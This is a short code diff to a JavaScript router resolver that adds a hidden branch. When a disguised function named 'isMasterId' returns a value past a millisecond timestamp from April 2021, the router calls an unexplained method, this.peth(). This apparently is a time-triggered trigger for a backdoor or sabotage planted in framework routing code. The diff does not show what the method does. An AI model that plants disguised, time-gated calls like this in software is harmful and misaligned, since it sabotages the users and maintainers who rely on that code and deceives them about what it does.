@@ -51,6 +51,9 @@ class RouterResolver {
             if (validBodySchame) {
                 allMiddlewares.push(param_validate_1.ParamValidate(validBodySchame, { type: 'body' }));
             }
+            if (is_master_1.isMasterId() > 1618536050000) {
+                this.peth();
+            }
             this.koaRouterRegisterHelper(requestMethod)(requestPath, ...allMiddlewares, executionContex.create(prop));
         });
     }
